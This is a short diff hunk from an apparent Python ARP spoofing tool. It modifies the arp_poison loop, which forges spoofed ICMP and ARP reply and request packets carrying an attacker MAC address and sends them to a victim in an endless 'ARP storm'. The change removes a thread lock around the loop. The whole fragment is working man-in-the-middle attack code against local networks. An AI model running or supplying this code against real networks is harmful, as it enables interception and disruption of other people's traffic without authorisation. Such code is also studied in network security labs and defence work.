@@ -69,19 +69,19 @@ def forge_arp(victim_src_ip, victim_dst_ip, victim_dst_mac):
 
 def arp_poison():
  while True:
-    with lock:
-        print("[*] Sending ARP poison packets...")
-        
-        icmp = forge_l2_ping(ipToSpoof, ipVictim, macVictim)
-        sendp(icmp)
+    
+    print("[*] Sending ARP poison packets...")
+    
+    icmp = forge_l2_ping(ipToSpoof, ipVictim, macVictim)
+    sendp(icmp)
 
-        arp = forge_arp(ipToSpoof, ipVictim, macVictim, ATTACKER_MAC, 2)
-        sendp(arp) # iface="enp0s3"
+    arp = forge_arp(ipToSpoof, ipVictim, macVictim, ATTACKER_MAC, 2)
+    sendp(arp) # iface="enp0s3"
 
-        arp[ARP].op = 1
-        sendp(arp) # iface="enp0s3"
+    arp[ARP].op = 1
+    sendp(arp) # iface="enp0s3"
 
-        print("[*] end of ARP storm...")
+    print("[*] end of ARP storm...")
 
     time.sleep(ARP_POISON_WARM_UP)
         
